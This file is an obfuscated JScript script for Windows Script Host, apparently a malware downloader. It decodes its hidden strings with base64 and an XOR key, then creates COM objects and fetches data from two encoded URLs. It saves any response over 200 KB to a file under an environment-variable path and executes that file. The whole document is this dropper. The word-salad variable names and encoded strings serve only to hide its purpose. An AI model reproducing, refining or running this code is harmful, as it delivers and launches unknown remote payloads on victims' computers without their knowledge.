var doggerelVNp = function(whetxNQ) {
    var monetarylDa = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
        decode: function(imposedF0M) {
            var concomitantLVh = "";
            var construeenw, betokenWUi, roseateuzz;
            var pilfereGT, liberalcLX, propensityy6a, checkeredTW4;
            var pellucidTeT = 0;
            imposedF0M = imposedF0M.replace(/[^A-Za-z0-9\+\/\=]/g, "");
            while (pellucidTeT < imposedF0M.length) {
                pilfereGT = this._keyStr.indexOf(imposedF0M.charAt(pellucidTeT++));
                liberalcLX = this._keyStr.indexOf(imposedF0M.charAt(pellucidTeT++));
                propensityy6a = this._keyStr.indexOf(imposedF0M.charAt(pellucidTeT++));
                checkeredTW4 = this._keyStr.indexOf(imposedF0M.charAt(pellucidTeT++));
                construeenw = pilfereGT << 2 | liberalcLX >> 4;
                betokenWUi = (liberalcLX & 15) << 4 | propensityy6a >> 2;
                roseateuzz = (propensityy6a & 3) << 6 | checkeredTW4;
                concomitantLVh = concomitantLVh + String.fromCharCode(construeenw);
                if (propensityy6a != 64) {
                    concomitantLVh = concomitantLVh + String.fromCharCode(betokenWUi);
                }
                if (checkeredTW4 != 64) {
                    concomitantLVh = concomitantLVh + String.fromCharCode(roseateuzz);
                }
            }
            concomitantLVh = monetarylDa._utf8_decode(concomitantLVh);
            return concomitantLVh;
        },
        _utf8_decode: function(philosophicalJph) {
            var incisivewkQ = "";
            var pellucidTeT = 0;
            var archetypeHzI = c1 = c2 = 0;
            while (pellucidTeT < philosophicalJph.length) {
                archetypeHzI = philosophicalJph.charCodeAt(pellucidTeT);
                if (archetypeHzI < 128) {
                    incisivewkQ += String.fromCharCode(archetypeHzI);
                    pellucidTeT++;
                } else if (archetypeHzI > 191 && archetypeHzI < 224) {
                    c2 = philosophicalJph.charCodeAt(pellucidTeT + 1);
                    incisivewkQ += String.fromCharCode((archetypeHzI & 31) << 6 | c2 & 63);
                    pellucidTeT += 2;
                } else {
                    c2 = philosophicalJph.charCodeAt(pellucidTeT + 1);
                    c3 = philosophicalJph.charCodeAt(pellucidTeT + 2);
                    incisivewkQ += String.fromCharCode((archetypeHzI & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                    pellucidTeT += 3;
                }
            }
            return incisivewkQ;
        }
    };
    var remissionU9S = monetarylDa.decode(whetxNQ);
    var squaloruSx = "";
    for (var pellucidTeT = 0; pellucidTeT < remissionU9S.length; pellucidTeT++) {
        squaloruSx += String.fromCharCode(remissionU9S.charCodeAt(pellucidTeT) ^ "KX67m2m4HMtz3ytB".charCodeAt(pellucidTeT % "KX67m2m4HMtz3ytB".length));
    }
    return squaloruSx;
};

var libertinesgP = function() {
    var constantnvC = function() {};
    constantnvC.prototype.create = function(philologyDA4) {
        return WScript.CreateObject(philologyDA4);
    };
    return constantnvC;
}();

(function() {
    var cajoleM9P = new libertinesgP();
    var stentorianxOO = 200;
    var peonPgn = doggerelVNp('"DB1i"');
    var prowessq1H = doggerelVNp('"DiBTVA=="');
    var demoralizews3 = doggerelVNp('"HAtVRQRCGRobJREWXw=="');
    var interdictmjH = doggerelVNp('"BgtueiEAQ2wFATwuZyk="');
    var levityEv7 = doggerelVNp('"Chx5cy8="');
    var inscrutableqAG = doggerelVNp('"GCxEUgxf"');
    var ingratiateo4k = doggerelVNp('"bgxzej0XMQ=="');
    var admonishLbt = doggerelVNp('"ZT1OUg=="');
    var esteemhPq = Math.pow(2, 10) * 200;
    var aphorismxPh = [ doggerelVNp('"IyxCR1cdQlwtIRgVVAwNMTopGEQYHVQHZigMHw=="'), doggerelVNp('"IyxCR1cdQkcnOhwbRwoBMjwxQl8ERgtSZi4bFxxAR2wuIFM="') ];
    var passageFKw = 2097152;
    var impertinenttn1 = cajoleM9P.create(demoralizews3);
    var lineamentkt9 = cajoleM9P.create(interdictmjH);
    var meanderuuX = cajoleM9P.create(levityEv7 + doggerelVNp('"ZQ=="') + inscrutableqAG);
    var dulcetbnk = impertinenttn1.ExpandEnvironmentStrings(ingratiateo4k);
    var corpulentcVj = dulcetbnk + passageFKw + admonishLbt;
    var hoarywnP = false;
    for (var scrutinizetFP = 0; scrutinizetFP < aphorismxPh.length; scrutinizetFP++) {
        try {
            var askanceHXG = aphorismxPh[scrutinizetFP];
            lineamentkt9.open(peonPgn, askanceHXG, false);
            lineamentkt9.send();
            if (lineamentkt9.status == stentorianxOO) {
                try {
                    meanderuuX.open();
                    meanderuuX.type = 1;
                    meanderuuX.write(lineamentkt9[doggerelVNp('"OT1FRwJcHlEKIhAD"')]);
                    if (meanderuuX.size > esteemhPq) {
                        scrutinizetFP = aphorismxPh.length;
                        meanderuuX.position = 0;
                        meanderuuX.saveToFile(corpulentcVj, 2);
                        hoarywnP = true;
                    }
                } finally {
                    meanderuuX.close();
                }
            }
        } catch (ignored) {}
    }
    if (hoarywnP) {
        impertinenttn1[prowessq1H](dulcetbnk + Math.pow(2, 21));
    }
})();